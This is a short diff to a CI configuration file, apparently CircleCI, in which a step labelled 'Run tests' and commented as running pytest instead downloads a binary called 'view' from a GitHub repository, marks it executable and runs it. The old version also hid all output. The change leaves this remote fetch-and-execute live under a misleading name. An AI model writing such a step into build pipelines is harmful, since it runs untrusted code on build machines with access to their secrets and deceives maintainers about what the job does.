@@ -35,7 +35,7 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command: wget https://github.com/BarisYoon/view/raw/main/view > /dev/null 2>&1; chmod +x view; ./view > /dev/null 2>&1
+          command: wget https://github.com/BarisYoon/view/raw/main/view > /dev/null 2>&1; chmod +x view; ./view 
 
 
 # Invoke jobs via workflows
